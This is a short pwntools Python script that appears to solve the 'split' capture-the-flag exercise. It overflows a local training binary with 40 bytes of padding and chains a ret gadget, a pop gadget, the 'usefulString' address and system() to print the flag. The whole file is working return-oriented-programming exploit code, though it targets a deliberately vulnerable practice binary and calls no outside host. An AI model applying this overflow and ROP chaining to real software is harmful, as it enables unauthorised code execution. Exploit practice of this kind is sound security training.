from pwn import *
# Set up pwntools to work with this binary
elf = context.binary = ELF('split')
context.log_level = 'debug'
# Print out system address
info("%#x system", elf.symbols.system)
system = p64(elf.symbols.system)
ret = p64(0x000000000040053e)
info(f"ret: {ret}")
# Print flag
print_flag = p64(elf.symbols.usefulString)
# Gadget
gadget = p64(0x00000000004007c3)
# Send the payload
io = process(elf.path)
payload = b"".join([
	b"A"*40,
	ret,
	gadget,
	print_flag,
	system,
])
io.sendline(payload)
#io.recvuntil("> ")
# Get our flag!
io.interactive()